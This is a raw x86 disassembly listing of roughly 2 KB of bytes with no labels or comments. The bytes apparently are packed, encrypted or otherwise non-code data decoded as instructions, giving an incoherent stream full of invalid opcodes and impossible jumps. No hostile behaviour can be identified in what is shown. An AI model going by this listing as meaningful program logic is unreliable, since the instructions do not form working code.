  4062a5:	fsubr  st(4),st
  4062a7:	mov    BYTE PTR [ebx],bh
  4062a9:	imul   ebp,DWORD PTR [edx-0x4f],0xcffafc0e
  4062b0:	ja     0x40628f
  4062b2:	out    0xa9,al
  4062b4:	rcr    BYTE PTR [edi-0x77f94081],cl
  4062ba:	ret    
  4062bb:	sahf   
  4062bc:	inc    edi
  4062bd:	je     0x4062c4
  4062bf:	mov    cl,0x28
  4062c1:	xchg   edi,eax
  4062c2:	sub    dh,ch
  4062c4:	shl    BYTE PTR cs:[ebp+0x7a3a8ae6],0xba
  4062cc:	mov    dh,0xef
  4062ce:	gs xchg ebx,eax
  4062d0:	(bad)  
  4062d1:	jns    0x406347
  4062d3:	stos   BYTE PTR es:[edi],al
  4062d4:	in     eax,dx
  4062d5:	cdq    
  4062d6:	push   ss
  4062d7:	sti    
  4062d8:	call   0xade58435
  4062dd:	icebp  
  4062de:	add    ah,BYTE PTR [ecx-0x23ff7ba5]
  4062e4:	mov    edi,0xab71322d
  4062e9:	imul   edi,DWORD PTR [ebx],0xffffff8d
  4062ec:	fimul  DWORD PTR [edi+0x44]
  4062ef:	addr16 jb 0x4062bf
  4062f2:	in     al,0xbd
  4062f4:	mov    cl,0x3c
  4062f6:	mov    ebx,0xeb1cd03e
  4062fb:	or     eax,0xee3e8812
  406300:	pushf  
  406301:	xchg   edx,eax
  406302:	fmul   DWORD PTR [esi]
  406304:	and    eax,0x236d0adc
  406309:	mov    ds:0x3308a146,al
  40630e:	sub    cl,dl
  406310:	mov    edi,0xc47de39b
  406315:	repz xchg esp,eax
  406317:	mov    edx,0x3c2b92de
  40631c:	jge    0x406321
  40631e:	mov    bl,0x48
  406320:	int    0x99
  406322:	pop    edx
  406323:	jno    0x406300
  406325:	xor    ebx,DWORD PTR [edi-0x7c]
  406328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406329:	sbb    BYTE PTR [ebx-0x63],bl
  40632c:	and    eax,0x578dedf3
  406331:	xchg   ecx,eax
  406332:	adc    DWORD PTR [edi-0x63d91e1a],ecx
  406338:	int    0x4f
  40633a:	leave  
  40633b:	div    BYTE PTR [ebp+0x118a158d]
  406341:	add    eax,0xa04e30b1
  406346:	aas    
  406347:	adc    al,BYTE PTR [ecx]
  406349:	fwait
  40634a:	inc    ecx
  40634b:	mov    esp,0xca25ecf7
  406350:	add    edi,DWORD PTR [edx+edi*8+0x51d1174d]
  406357:	imul   ebp,DWORD PTR [ebp-0x507182b],0x15
  40635e:	push   0xf67e298d
  406363:	cmp    eax,0x656e6d47
  406368:	dec    ebp
  406369:	cld    
  40636a:	ror    DWORD PTR [esi],1
  40636c:	jle    0x4062fc
  40636e:	mov    ebx,0xd2436824
  406373:	xchg   ecx,eax
  406374:	mov    ds:0x4b73089d,al
  406379:	dec    ebx
  40637a:	push   ebx
  40637b:	lods   al,BYTE PTR ds:[esi]
  40637c:	loopne 0x406311
  40637e:	icebp  
  40637f:	inc    edi
  406380:	leave  
  406381:	(bad)  
  406382:	popf   
  406383:	mov    esp,0x2ac48bbf
  406388:	(bad)  
  406389:	cld    
  40638a:	in     al,dx
  40638b:	inc    esp
  40638c:	cmp    cl,BYTE PTR [eax+0x3]
  40638f:	ror    BYTE PTR [ecx+0x39],1
  406392:	push   ecx
  406393:	es mov dh,0xd
  406396:	leave  
  406397:	add    BYTE PTR [ecx+0x2a],dl
  40639a:	dec    dh
  40639c:	inc    ebx
  40639d:	lods   al,BYTE PTR ds:[esi]
  40639e:	icebp  
  40639f:	push   ds
  4063a0:	enter  0x307a,0xe8
  4063a4:	cmp    DWORD PTR [ebx],edi
  4063a6:	fwait
  4063a7:	mov    ah,0x46
  4063a9:	arpl   WORD PTR [edx],di
  4063ab:	cwde   
  4063ac:	loopne 0x4063a8
  4063ae:	cmp    eax,ecx
  4063b0:	jb     0x4063bd
  4063b2:	cdq    
  4063b3:	ja     0x4063ff
  4063b5:	int    0x69
  4063b7:	push   0x2e
  4063b9:	fldcw  WORD PTR [esi-0x6b]
  4063bc:	stos   DWORD PTR es:[edi],eax
  4063bd:	in     eax,0xdd
  4063bf:	mov    cl,0x4
  4063c1:	aam    0xbe
  4063c3:	sub    eax,0xcedb223c
  4063c8:	in     al,dx
  4063c9:	jno    0x4063d8
  4063cb:	enter  0xd813,0x44
  4063cf:	mov    eax,0xa80a434d
  4063d4:	xor    eax,edx
  4063d6:	cdq    
  4063d7:	std    
  4063d8:	stos   DWORD PTR es:[edi],eax
  4063d9:	daa    
  4063da:	out    0xc9,al
  4063dc:	(bad)  
  4063dd:	jmp    0x4063c1
  4063df:	xor    eax,0xc1e8f1be
  4063e4:	jecxz  0x40642a
  4063e6:	add    DWORD PTR [ebx+0x2e860c5],ebx
  4063ec:	clc    
  4063ed:	push   0x4bbabd13
  4063f2:	cmp    DWORD PTR [ecx-0x449eda1c],0x11d95e35
  4063fc:	lods   al,BYTE PTR ds:[esi]
  4063fd:	loopne 0x406397
  4063ff:	dec    ebp
  406400:	in     eax,0xe1
  406402:	pop    esi
  406403:	lea    edx,[edx-0x7]
  406406:	(bad)  
  406407:	push   edi
  406408:	ss dec edx
  40640a:	fcomp  DWORD PTR [ebp+edx*4+0x3283e0a1]
  406411:	jmp    0x406478
  406413:	sbb    dh,ah
  406415:	mov    edx,0x1ad8847
  40641a:	dec    edi
  40641b:	pop    esi
  40641c:	push   0x62
  40641e:	cli    
  40641f:	dec    edx
  406420:	push   cs
  406421:	or     edx,DWORD PTR [edx+0xd]
  406424:	jl     0x406469
  406426:	popa   
  406427:	out    dx,eax
  406428:	into   
  406429:	cmp    bl,cl
  40642b:	dec    edx
  40642c:	xchg   edx,eax
  40642d:	and    eax,DWORD PTR [esi]
  40642f:	cmp    ah,BYTE PTR [ecx]
  406431:	lods   al,BYTE PTR ds:[esi]
  406432:	pop    ebp
  406433:	ret    
  406434:	ins    BYTE PTR es:[edi],dx
  406435:	xor    BYTE PTR [edi],0x7e
  406438:	ret    
  406439:	and    eax,0xc39e1930
  40643e:	xchg   edi,eax
  40643f:	shl    DWORD PTR [ecx-0x4a731e02],1
  406445:	dec    edi
  406446:	retf   
  406447:	mov    bh,0xd
  406449:	and    DWORD PTR [edi],ebp
  40644b:	push   ds
  40644c:	test   BYTE PTR [ebx+0x2a76b44e],dh
  406452:	test   al,0x30
  406454:	sbb    eax,0x4da1af12
  406459:	add    bh,BYTE PTR [esi+0x26]
  40645c:	aam    0x8c
  40645e:	jno    0x4064d9
  406460:	xchg   BYTE PTR [ebx-0x7f05e7ad],cl
  406466:	pop    edi
  406467:	pop    edi
  406468:	mov    ds:0x1107015b,al
  40646d:	xchg   ecx,esp
  40646f:	shl    dl,1
  406471:	icebp  
  406472:	inc    edi
  406473:	call   0x7266b538
  406478:	jp     0x40640c
  40647a:	xlat   BYTE PTR ds:[ebx]
  40647b:	push   cs
  40647c:	push   es
  40647d:	xchg   BYTE PTR ds:0xbbdf2107,ch
  406483:	mov    dh,0xd2
  406485:	dec    edi
  406486:	jns    0x406446
  406488:	lock mov edx,0xeea24877
  40648e:	pop    ebp
  40648f:	stos   DWORD PTR es:[edi],eax
  406490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406491:	fsubr  st(1),st
  406493:	add    eax,0x5c858d31
  406498:	pop    eax
  406499:	jmp    0x406458
  40649b:	bswap  esp
  40649d:	ins    BYTE PTR es:[edi],dx
  40649e:	out    0x82,al
  4064a0:	jg     0xdae58617
  4064a6:	fld    QWORD PTR [esi]
  4064a8:	jl     0x4064c2
  4064aa:	mov    bh,0x19
  4064ac:	hlt    
  4064ad:	rcl    DWORD PTR [ebx+0x52],1
  4064b0:	repz push edi
  4064b2:	sbb    cl,BYTE PTR [edi-0x19]
  4064b5:	cmp    dl,cl
  4064b7:	test   edi,ecx
  4064b9:	jnp    0x4064b7
  4064bb:	in     eax,dx
  4064bc:	add    DWORD PTR [eax],eax
  4064be:	sbb    eax,0x48e5f410
  4064c3:	xor    BYTE PTR [ecx+0xc70d5fb],bl
  4064c9:	test   edx,eax
  4064cb:	cwde   
  4064cc:	lods   al,BYTE PTR ds:[esi]
  4064cd:	xchg   DWORD PTR [edi-0x783471a6],edi
  4064d3:	ins    BYTE PTR es:[edi],dx
  4064d4:	mov    al,ds:0x87e2a8e3
  4064d9:	push   ecx
  4064da:	adc    eax,0x5dbf209a
  4064df:	inc    ecx
  4064e0:	ins    DWORD PTR es:[edi],dx
  4064e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064e2:	add    ch,al
  4064e4:	mov    bl,0x7e
  4064e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064e7:	push   esi
  4064e8:	(bad)  
  4064e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064ea:	sti    
  4064eb:	ins    DWORD PTR es:[edi],dx
  4064ec:	mov    BYTE PTR [ebp+0x7d],ah
  4064ef:	jmp    FWORD PTR [ebp+ecx*8+0x53b31c01]
  4064f6:	dec    ecx
  4064f7:	jp     0x406500
  4064f9:	in     al,dx
  4064fa:	and    al,0x53
  4064fc:	jl     0x406537
  4064fe:	ja     0x406514
  406500:	in     al,dx
  406501:	or     dh,bl
  406503:	fimul  WORD PTR [edi]
  406505:	push   eax
  406506:	xchg   edi,eax
  406507:	xor    eax,0x4bff7810
  40650c:	out    0x33,eax
  40650e:	sub    eax,ecx
  406510:	(bad)  
  406512:	dec    edi
  406513:	jb     0x40654a
  406515:	es pop esp
  406517:	(bad)  
  406518:	sti    
  406519:	mov    ecx,0xe567ce22
  40651e:	sar    DWORD PTR [esi-0x14],cl
  406521:	stc    
  406522:	xor    BYTE PTR [esp+eax*2+0x44],0x13
  406527:	xchg   edi,eax
  406528:	and    ebx,DWORD PTR [ebx]
  40652a:	jmp    0x4064b5
  40652c:	imul   eax,DWORD PTR [eax],0x19d25fdb
  406532:	(bad)  
  406533:	lea    edx,[edi+0xa1048a8]
  406539:	loopne 0x406582
  40653b:	in     al,0xa6
  40653d:	je     0x406525
  40653f:	outs   dx,DWORD PTR ds:[esi]
  406540:	add    ch,BYTE PTR [ebx-0x48]
  406543:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406544:	fld    DWORD PTR [eax-0x34936a12]
  40654a:	fisttp WORD PTR [ecx+0x11]
  40654d:	mov    dh,0xea
  40654f:	push   ds
  406550:	pop    esi
  406551:	scas   eax,DWORD PTR es:[edi]
  406552:	jg     0x40653b
  406554:	sub    esi,ebx
  406556:	mov    ds:0xf35abc0c,al
  40655b:	mov    esi,0xd8dc4d47
  406560:	ins    DWORD PTR es:[edi],dx
  406561:	jmp    0x406561
  406563:	xor    eax,0x7825e05c
  406568:	cmp    DWORD PTR [ebp+0x6fbf9f20],esp
  40656e:	shr    BYTE PTR [ecx-0x2a78ca65],0xea
  406575:	mov    ds:0x97a0c8cd,al
  40657a:	pop    es
  40657b:	xor    dl,dl
  40657d:	sbb    BYTE PTR [ecx],bh
  40657f:	mov    eax,0xa6e629d2
  406584:	mov    WORD PTR [esi+0x4b],cs
  406587:	leave  
  406588:	aad    0x85
  40658a:	cmc    
  40658b:	icebp  
  40658c:	jecxz  0x40658b
  40658e:	jge    0x40660b
  406590:	pushf  
  406591:	jne    0x406561
  406593:	imul   edi,DWORD PTR ss:[eax],0x5df50891
  40659a:	adc    DWORD PTR [edx+0x4f],edi
  40659d:	pop    ecx
  40659e:	mov    esi,0x370338c7
  4065a3:	inc    ecx
  4065a4:	ror    BYTE PTR [esi-0x7c],0xf2
  4065a8:	add    al,BYTE PTR [edi-0x6870bbf3]
  4065ae:	adc    ah,BYTE PTR [edx+0x1cdd404d]
  4065b4:	shl    BYTE PTR [eax-0x363604b2],1
  4065ba:	clc    
  4065bb:	cmc    
  4065bc:	add    dh,bh
  4065be:	outs   dx,BYTE PTR ds:[esi]
  4065bf:	in     al,dx
  4065c0:	mov    ecx,0xc3c4b16
  4065c5:	es jbe 0x4065d3
  4065c8:	retf   0x3891
  4065cb:	add    eax,0x7231d5e4
  4065d0:	xchg   esp,eax
  4065d1:	iret   
  4065d2:	jecxz  0x40663d
  4065d4:	shl    BYTE PTR [edi+0xb42c009],1
  4065da:	ins    DWORD PTR es:[edi],dx
  4065db:	xacquire xchg BYTE PTR [esi-0x2180469],ah
  4065e2:	loopne 0x406568
  4065e4:	inc    BYTE PTR [edi+0x41d2fe88]
  4065ea:	imul   esi,edi,0xfffffffa
  4065ed:	adc    al,0x7d
  4065ef:	ficom  DWORD PTR [ebx+0x2f]
  4065f2:	push   esp
  4065f3:	pop    esi
  4065f4:	pop    ebp
  4065f5:	repnz add ch,al
  4065f8:	mov    ch,0x3f
  4065fa:	inc    edi
  4065fb:	loop   0x406618
  4065fd:	(bad)  
  4065fe:	mov    ebx,0x20610e64
  406603:	out    dx,al
  406604:	or     BYTE PTR [ecx+ebp*2+0x4cb4c074],dl
  40660b:	xchg   ecx,eax
  40660c:	retf   
  40660d:	sahf   
  40660e:	mov    dh,0x22
  406610:	mov    eax,ecx
  406612:	adc    al,BYTE PTR [edi+eax*1+0x45b6e304]
  406619:	add    DWORD PTR ds:0x6932f510,esi
  40661f:	fcmovu st,st(1)
  406621:	push   edi
  406622:	shl    DWORD PTR [edx],0x1b
  406625:	shl    BYTE PTR [bp+si+0x3c],cl
  406629:	inc    ebp
  40662a:	mov    edi,0x3d57d3cf
  40662f:	pop    ebx
  406630:	scas   eax,DWORD PTR es:[edi]
  406631:	pop    es
  406632:	retf   0x724e
  406635:	retf   0x82a4
  406638:	mov    esi,0xaf672b76
  40663d:	adc    al,0x72
  40663f:	mov    ah,0xe
  406641:	les    ebx,FWORD PTR [edx-0x2c5712f1]
  406647:	(bad)  
  406648:	or     BYTE PTR [ebp+0x7f],ah
  40664b:	mov    ecx,0xcda85c5b
  406650:	pop    edi
  406651:	in     eax,0xce
  406653:	stc    
  406654:	pop    eax
  406655:	imul   BYTE PTR [edi-0x42f00fe4]
  40665b:	mov    ebp,0x99fabe7c
  406660:	mov    ebp,0x5567c537
  406665:	stc    
  406666:	sub    dh,BYTE PTR [ebx-0x3]
  406669:	repz inc edi
  40666b:	mov    eax,ecx
  40666d:	jg     0x4066b9
  40666f:	xor    al,0x6
  406671:	or     bl,al
  406673:	and    esi,DWORD PTR [edx]
  406675:	sub    BYTE PTR [ebx+0x73],bh
  406678:	xchg   esp,eax
  406679:	leave  
  40667a:	stc    
  40667b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40667c:	jmp    0x4066c6
  40667e:	call   0xb3a1:0x88744607
  406685:	cdq    
  406686:	xchg   ecx,eax
  406687:	sti    
  406688:	sti    
  406689:	or     edx,DWORD PTR [ebx+0x19]
  40668c:	arpl   WORD PTR [eax+0x4c5a57c7],sp
  406692:	icebp  
  406693:	data16 and al,0x54
  406696:	test   eax,0x8c579c65
  40669b:	add    DWORD PTR [esi],ebx
  40669d:	push   ebp
  40669e:	push   esp
  40669f:	int    0x38
  4066a1:	imul   eax,edi,0xb7251343
  4066a7:	xchg   esi,eax
  4066a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066a9:	addr16 jbe 0x406718
  4066ac:	push   es
  4066ad:	(bad)  
  4066af:	pop    ebx
  4066b0:	int    0x8c
  4066b2:	jne    0x406716
  4066b4:	mov    ebx,edx
  4066b6:	mov    bh,0x3d
  4066b8:	and    BYTE PTR [ebx],ch
  4066ba:	shr    DWORD PTR [eax],cl
  4066bc:	popf   
  4066bd:	push   ebp
  4066be:	out    0xd,al
  4066c0:	xor    esp,esi
  4066c2:	jge    0x406676
  4066c4:	sub    eax,0x754312d2
  4066c9:	rol    DWORD PTR [eax-0x15],1
  4066cc:	jg     0x4066ad
  4066ce:	bound  esp,QWORD PTR [edi-0x424d4cc2]
  4066d4:	or     DWORD PTR ds:0x177934a8,ebx
  4066da:	into   
  4066db:	outs   dx,DWORD PTR ds:[esi]
  4066dc:	mov    al,0xbe
  4066de:	fistp  DWORD PTR ds:0x3c39e171
  4066e4:	cmp    cl,dl
  4066e6:	push   ss
  4066e7:	cmp    DWORD PTR [esi],edx
  4066e9:	pop    esp
  4066ea:	and    BYTE PTR [eax-0x66],dh
  4066ed:	xor    ebx,ebp
  4066ef:	loope  0x40671c
  4066f1:	sbb    ecx,DWORD PTR [ebp+0x58]
  4066f4:	mov    al,0x45
  4066f6:	mov    al,ds:0xb20fe46f
  4066fb:	(bad)  
  4066fc:	sbb    BYTE PTR [ebp-0x3b],ch
  4066ff:	jge    0x40673d
  406701:	ja     0x406701
  406703:	pop    ss
  406704:	fs ror ecx,cl
  406707:	mov    fs,esp
  406709:	fmul   QWORD PTR [ecx+0x32b86ede]
  40670f:	jl     0x406713
  406711:	(bad)  
  406712:	xor    esi,DWORD PTR [eax+0x59]
  406715:	ficom  DWORD PTR [edi+eax*4]
  406718:	dec    esi
  406719:	bound  ebp,QWORD PTR [ebx+ebp*4]
  40671c:	pop    edi
  40671d:	and    al,0x9f
  40671f:	and    al,0x18
  406721:	aad    0x83
  406723:	xor    DWORD PTR [ebx],esi
  406725:	out    dx,eax
  406726:	mov    al,0x22
  406728:	mov    edx,0x49dc35a4
  40672d:	out    dx,al
  40672e:	jmp    0x1958:0x5200e65c
  406735:	sub    al,0xc7
  406737:	add    ah,bh
  406739:	dec    ecx
  40673a:	test   BYTE PTR [edi-0x27],dh
  40673d:	dec    ebp
  40673e:	stos   DWORD PTR es:[edi],eax
  40673f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406740:	inc    esp
  406741:	pop    eax
  406742:	add    DWORD PTR [edi-0x34],ebx
  406745:	ins    DWORD PTR es:[edi],dx
  406746:	or     ecx,DWORD PTR [ecx]
  406748:	xchg   esi,eax
  406749:	test   BYTE PTR [esi],al
  40674b:	and    DWORD PTR [edi+0x16],esi
  40674e:	lods   al,BYTE PTR ds:[esi]
  40674f:	dec    ebp
  406750:	dec    eax
  406751:	inc    esp
  406752:	ror    ebp,1
  406754:	or     ebp,DWORD PTR [esi+ebp*8]
  406757:	ins    DWORD PTR es:[edi],dx
  406758:	or     BYTE PTR cs:[edx],bh
  40675b:	mov    eax,0x5ab8c547
  406760:	xor    BYTE PTR [esi-0x6d],ah
  406763:	popf   
  406764:	xchg   BYTE PTR [edi],ah
  406766:	shl    BYTE PTR [ecx+0x32],cl
  406769:	sti    
  40676a:	out    0x28,eax
  40676c:	mov    edx,0x68139d10
  406771:	xacquire xchg DWORD PTR fs:[esi-0x53],ebp
  406776:	ret    
  406777:	lods   eax,DWORD PTR ds:[esi]
  406778:	jns    0x40673d
  40677a:	dec    ebp
  40677b:	dec    ecx
  40677c:	inc    ecx
  40677d:	and    DWORD PTR [esi-0x5eee7a35],ebp
  406783:	xor    ch,BYTE PTR [eax-0x74]
  406786:	lods   al,BYTE PTR ds:[esi]
  406787:	push   ecx
  406788:	or     ebx,DWORD PTR [esi+0x2b]
  40678b:	dec    esp
  40678c:	jecxz  0x40675c
  40678e:	sbb    dl,BYTE PTR [ecx]
  406790:	dec    esi
  406791:	fisubr DWORD PTR [eax]
  406793:	xchg   esp,eax
  406794:	jg     0x406790
  406796:	adc    BYTE PTR [eax+0x64],al
  406799:	adc    BYTE PTR [esi-0x29],al
  40679c:	mov    dh,0x4c
  40679e:	or     eax,0x73db92a3
  4067a3:	(bad)  
  4067a4:	lock pop ebx
  4067a6:	xor    ecx,DWORD PTR [esi+0x5d]
  4067a9:	jl     0x40681d
  4067ab:	add    al,BYTE PTR [esp+ecx*4+0x643afabd]
  4067b2:	(bad)  
  4067b3:	mul    DWORD PTR [esi-0x24684b26]
  4067b9:	stos   DWORD PTR es:[edi],eax
  4067ba:	fisttp DWORD PTR [ebx-0x29]
  4067bd:	xchg   esi,eax
  4067be:	repnz (bad) 
  4067c0:	xor    DWORD PTR [ebx+0x3dd33364],edi
  4067c6:	cld    
  4067c7:	xor    bh,dl
  4067c9:	jmp    0x40683f
  4067cb:	lock retf 0xddf3
  4067cf:	sbb    esi,DWORD PTR [eax]
  4067d1:	inc    ebx
  4067d2:	sbb    al,0xb6
  4067d4:	and    ch,0x6b
  4067d7:	(bad)  
  4067d8:	pop    ss
  4067d9:	sbb    ah,dl
  4067db:	pop    es
  4067dc:	mov    esp,esp
  4067de:	test   eax,0xbeb3f9c2
  4067e3:	inc    edi
  4067e4:	adc    DWORD PTR [esp+edx*4],ebp
  4067e7:	rol    BYTE PTR [eax+0x7ff06358],cl
  4067ed:	sub    edx,DWORD PTR [edx-0x4b37132c]
  4067f3:	push   ecx
  4067f4:	sti    
  4067f5:	mov    es,esi
  4067f7:	or     eax,esi
  4067f9:	test   dh,0xce
  4067fc:	jb     0x4067ef
  4067fe:	push   ecx
  4067ff:	dec    ebx
  406800:	out    dx,al
  406801:	fbstp  TBYTE PTR [edi+0x19cc96a8]
  406807:	ins    DWORD PTR es:[edi],dx
  406808:	inc    edi
  406809:	mov    edx,DWORD PTR [ecx+0x5a301f6f]
  40680f:	pop    ss
  406810:	cmp    edi,DWORD PTR [ecx-0x52]
  406813:	sub    BYTE PTR [ebp-0x624dfa99],al
  406819:	push   edi
  40681a:	jp     0x40682c
  40681c:	cwde   
  40681d:	out    dx,al
  40681e:	sbb    al,0x51
  406820:	pushf  
  406821:	and    eax,0xf68a91fe
  406826:	inc    eax
  406827:	pop    eax
  406828:	repnz mov ch,0x1f
  40682b:	push   ss
  40682c:	shl    DWORD PTR [ecx],cl
  40682e:	pop    esi
  40682f:	test   BYTE PTR [esi+0x55],ch
  406832:	sti    
  406833:	jle    0x40686d
  406835:	loopne 0x4067c0
  406837:	cmp    al,0x5f
  406839:	jno    0x406853
  40683b:	mov    ebp,0xf1bba146
  406840:	aam    0x9c
  406842:	enter  0x1306,0x24
  406846:	outs   dx,BYTE PTR ds:[esi]
  406847:	aam    0x5c
  406849:	cmc    
  40684a:	pusha  
  40684b:	mov    dh,BYTE PTR [edi]
  40684d:	pusha  
  40684e:	adc    DWORD PTR [edi+0x38907844],esi
  406854:	les    ebx,FWORD PTR [esi-0xb]
  406857:	xor    eax,0x69c65b47
  40685c:	call   0x33ee:0x60dc57f3
  406863:	sub    DWORD PTR [ebx-0x5189f443],ebx
  406869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40686a:	adc    DWORD PTR [esi-0x70b0eecf],eax
  406870:	out    dx,al
  406871:	xor    eax,0x43c7985d
  406876:	gs das 
  406878:	add    esi,DWORD PTR [edi+0x3b32737b]
  40687e:	fidivr WORD PTR [ebp-0x40]
  406881:	sahf   
  406882:	sbb    BYTE PTR [edi],bh
  406884:	sbb    edi,edi
  406886:	mov    ecx,0x6d05ddee
  40688b:	das    
  40688c:	xchg   BYTE PTR fs:[edi+0x2c],bl
  406890:	or     eax,0x99340f3a
  406895:	adc    BYTE PTR [ecx+0x5f96fdcd],dh
  40689b:	push   esp
  40689c:	xchg   edx,eax
  40689d:	xor    DWORD PTR [edi-0x11],esi
  4068a0:	mov    DWORD PTR ds:0xe90b05c2,esi
  4068a6:	(bad)  
  4068a7:	or     eax,0x3261e4fe
  4068ac:	push   esi
  4068ad:	jbe    0x4068aa
  4068af:	lahf   
  4068b0:	sti    
  4068b1:	clc    
  4068b2:	in     eax,0xed
  4068b4:	and    DWORD PTR [eax-0x18],edx
  4068b7:	call   0x6d5fabd2
  4068bc:	call   0x24664563
  4068c1:	dec    esi
  4068c2:	mov    ecx,0x44f41079
  4068c7:	push   0x77
  4068c9:	in     al,0xb6
  4068cb:	mov    ?,WORD PTR [edx]
  4068cd:	add    DWORD PTR [edx-0x27],0x66
  4068d1:	cli    
  4068d2:	cwde   
  4068d3:	es fcmovnbe st,st(7)
  4068d6:	and    eax,0x5eb69baf
  4068db:	pushf  
  4068dc:	popf   
  4068dd:	dec    edx
  4068de:	xchg   esi,eax
  4068df:	mov    ecx,0x1ebea285
  4068e4:	add    DWORD PTR [edi-0x2d],esp
  4068e7:	out    0x6b,eax
  4068e9:	mov    bl,0xae
  4068eb:	xor    dl,al
  4068ed:	fcom   DWORD PTR [ebx]
  4068ef:	push   ds
  4068f0:	iret   
  4068f1:	sbb    BYTE PTR [ebp-0xe],0x66
  4068f5:	loope  0x40691d
  4068f7:	dec    edx
  4068f8:	(bad)  
  4068fa:	add    al,0xf9
  4068fc:	and    ebx,ebx
  4068fe:	fsubr  QWORD PTR [ebx+0x55]
  406901:	dec    edx
  406902:	mov    ah,0x9
  406904:	jecxz  0x4068cf
  406906:	js     0x406981
  406908:	popf   
  406909:	mov    edx,ds
  40690b:	or     DWORD PTR [edx],eax
  40690d:	pusha  
  40690e:	push   edi
  40690f:	adc    BYTE PTR [esi-0x58],bh
  406912:	mov    ebx,0x530a8f9f
  406917:	xor    eax,0x15d78241
  40691c:	mov    bl,0x81
  40691e:	sbb    DWORD PTR [esi],eax
  406920:	ins    DWORD PTR es:[edi],dx
  406921:	icebp  
  406922:	nop    DWORD PTR gs:[esi+0x4a]
  406927:	out    dx,eax
  406928:	mov    esi,0xcf79b165
  40692d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40692e:	out    dx,eax
  40692f:	ret    
  406930:	iret   
  406931:	cwde   
  406932:	dec    ebp
  406933:	cdq    
  406934:	or     BYTE PTR [esi],0x71
  406937:	add    eax,0xe9834e43
  40693c:	dec    ecx
  40693d:	data16 (bad) 
  40693f:	cwde   
  406940:	inc    edi
  406941:	mov    fs,WORD PTR [ecx-0x1253f94c]
  406947:	and    al,0x26
  406949:	mov    ecx,0x5b695beb
  40694e:	xchg   BYTE PTR ds:0xe6af4f44,bl
  406954:	adc    BYTE PTR [eax+0x1fd4e6ef],0x62
  40695b:	xor    ecx,esi
  40695d:	jne    0x406976
  40695f:	inc    ecx
  406960:	mov    ebp,edi
  406962:	(bad)  
  406963:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406964:	ficom  WORD PTR [ecx-0x7f]
  406967:	fsub   DWORD PTR [ebx-0x2a]
  40696a:	cmp    al,0x26
  40696c:	stos   BYTE PTR es:[edi],al
  40696d:	(bad)  
  40696e:	sbb    cl,bh
  406970:	push   0xd122650a
  406975:	mov    eax,ds:0x7bb15be4
  40697a:	daa    
  40697b:	mov    WORD PTR [ebx+0x736bbdd6],?
  406981:	inc    edx
  406982:	push   eax
  406983:	rep ins DWORD PTR es:[edi],dx
  406985:	rol    esp,cl
  406987:	cwde   
  406988:	ret    0xfc8c
  40698b:	(bad)  
  40698c:	or     bh,BYTE PTR [ecx+0x594e7ac9]
  406992:	cmp    DWORD PTR [esi-0x3e],esi
  406995:	sbb    BYTE PTR [ebx+0x71d5178d],dl
  40699b:	adc    eax,0x4a2ad3a6
  4069a0:	cmc    
  4069a1:	iret   
  4069a2:	fsubr  st(6),st
  4069a4:	pop    es
  4069a5:	loop   0x4069ce
  4069a7:	repz test ebx,esi
  4069aa:	inc    edx
  4069ab:	(bad)  
  4069ac:	in     eax,dx
  4069ad:	xchg   ebx,eax
  4069ae:	pusha  
  4069af:	popa   
  4069b0:	out    0x74,eax
  4069b2:	mov    ds:0xb116c1a9,al
  4069b7:	fild   WORD PTR gs:[eax+edx*1-0x7a]
  4069bc:	mov    ch,BYTE PTR [eax+esi*1-0x11]
  4069c0:	mov    ah,BYTE PTR [esi]
  4069c2:	fwait
  4069c3:	xchg   ebx,eax
  4069c4:	push   ebx
  4069c5:	and    al,0x95
  4069c7:	mov    ch,0x3
  4069c9:	loop   0x4069ba
  4069cb:	pop    ecx
  4069cc:	xchg   ebp,eax
  4069cd:	aad    0x24
  4069cf:	mov    al,BYTE PTR [ecx+0x607ef653]
  4069d5:	xor    eax,DWORD PTR [ebp+0x77]
  4069d8:	mov    ebx,0x907183cb
  4069dd:	mov    al,0xd5
  4069df:	mov    edi,0x9e5804e6
  4069e4:	in     al,0x3b
  4069e6:	clc    
  4069e7:	adc    bh,BYTE PTR [edi]
  4069e9:	pop    ebp
  4069ea:	lods   al,BYTE PTR ds:[esi]
  4069eb:	test   BYTE PTR [ebp-0x6f],cl
  4069ee:	or     DWORD PTR [ebx+0x35],0xffffffba
  4069f2:	idiv   BYTE PTR ds:0x6dab9425
  4069f8:	imul   BYTE PTR [edi-0x1e5c56a8]
  4069fe:	jmp    0x86072eb0
  406a03:	popa   
  406a04:	push   edx
  406a05:	sbb    ecx,DWORD PTR [ebp+0x4a]
  406a08:	sbb    ecx,DWORD PTR ds:0x41db0b7b
  406a0e:	nop
  406a0f:	cmp    esi,0x309c46b1
  406a15:	hlt    
  406a16:	iret   
  406a17:	dec    esp
  406a18:	xor    esi,DWORD PTR [edx-0x6]
  406a1b:	sbb    esi,edi
  406a1d:	push   esp
  406a1e:	xchg   edi,eax
  406a1f:	push   0xffffffbe
  406a21:	loop   0x4069c3
  406a23:	adc    al,dh
  406a25:	add    bh,BYTE PTR [esi+0x35d17d9f]
  406a2b:	push   es
  406a2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a2d:	push   ds
  406a2e:	into   
  406a2f:	sbb    cl,BYTE PTR [ecx-0x64]
  406a32:	ja     0x406a4e
  406a34:	fmul   QWORD PTR [edx+0x5b]
  406a37:	sbb    eax,DWORD PTR [esi-0x657ad878]
  406a3d:	push   ds
  406a3e:	sti    
  406a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a40:	inc    edx
  406a41:	aas    
  406a42:	fdivr  QWORD PTR [ebx-0x6b9a52f5]
  406a48:	add    eax,0xcc71eb62
  406a4d:	jge    0x406aac
  406a4f:	bnd ja 0x406ad1
  406a52:	(bad)  
  406a53:	xchg   DWORD PTR [ecx+0x23f6848f],esp
  406a59:	imul   ebx,DWORD PTR [ecx],0xffffff96
